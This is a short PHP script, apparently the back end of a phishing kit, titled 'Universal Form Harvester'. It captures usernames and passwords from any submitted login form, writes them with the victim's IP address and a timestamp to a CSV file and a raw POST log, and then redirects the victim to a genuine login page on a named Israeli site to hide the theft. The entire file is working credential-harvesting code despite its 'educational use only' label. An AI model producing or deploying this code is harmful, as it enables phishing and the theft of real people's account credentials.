<?php
// Universal Form Harvester - Auto-generated
// Author: You
// For educational use only

error_reporting(0);
date_default_timezone_set("UTC");

// Target CSV path on your local machine
$csv_path = "/var/www/html/credentials.csv";
$debug_log = "/home/kali/Desktop/My_Scripts/Phishing/Templates/debug_dump.log";

// Initialize values
$username = "UNKNOWN";
$password = "UNKNOWN";

// Try to identify username based on value heuristics
foreach ($_POST as $key => $value) {
    $value_trimmed = is_array($value) ? json_encode($value) : trim($value);
    if ($username === "UNKNOWN" && preg_match("/^.+@.+\..+$/", $value_trimmed)) {
        $username = $value_trimmed;
    }
}

// Fallback to key-based username if value-based fails
if ($username === "UNKNOWN") {
    foreach ($_POST as $key => $value) {
        $lower = strtolower($key);
        $value_trimmed = is_array($value) ? json_encode($value) : trim($value);
        if (preg_match('/(user(name)?|uname|login|email|id|un)/i', $lower)) {
            $username = $value_trimmed;
            break;
        }
    }
}

// Password always based on key name heuristics
foreach ($_POST as $key => $value) {
    $lower = strtolower($key);
    $value_trimmed = is_array($value) ? json_encode($value) : trim($value);
    if (preg_match('/(pass(word)?|pw|pword)/i', $lower)) {
        $password = $value_trimmed;
        break;
    }
}

// Timestamp and IP
$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

// CSV line format
$csv_line = "\"$username\",\"$password\",\"$timestamp\",\"$ip\"\n";

// Write to CSV file
file_put_contents($csv_path, $csv_line, FILE_APPEND);

// Save raw POST data for debugging (optional)
file_put_contents($debug_log, print_r($_POST, true), FILE_APPEND);

// Redirect user to real site
header("Location: https://main.timetable.co.il/DefaultLogin.aspx?_gl=1*1nblyyg*_gcl_au*MjA5MTcwMTQyNi4xNzQ3OTk0NDA3");
exit();
?>
